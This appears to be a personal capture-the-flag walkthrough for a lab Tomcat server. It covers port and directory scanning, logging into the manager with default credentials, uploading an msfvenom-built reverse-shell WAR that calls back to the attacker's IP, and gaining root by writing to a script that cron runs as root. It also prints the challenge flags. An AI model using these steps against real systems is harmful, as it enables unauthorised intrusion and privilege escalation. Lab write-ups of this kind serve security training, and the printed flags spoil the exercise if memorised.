```
export IP=10.10.79.3

Nmap
-------------------------------------------
nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   syn-ack ttl 63 Apache Jserv (Protocol v1.3)
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.5
-------------------------------------------

Gobuster
-------------------------------------------
gobuster -u http://$IP:8080 -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -o gobuster_init

/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
-------------------------------------------

When navigating to http://10.10.79.3:8080/manager/html we get an auth eroor but somehow we are given creds. 
username	:	tomcat
password	:	s3cret

We have an upload option there and it requires a war file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.12.130 LPORT=1234 -f war > shell.war

On uploading, we found our shell on clicking it we got our reverse shelll

user.txt
==================================
39400c90bc683a41a8935e4719f181bf
==================================

/etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /home/jack && bash id.sh

tomcat@ubuntu:/home/jack$ ls
ls
id.sh  root.txt  test.txt  user.txt

echo "cp /root/root.txt /home/jack/root.txt" > id.sh

root.txt 
==================================
d89d5391984c0450a95497153ae7ca3a
==================================
```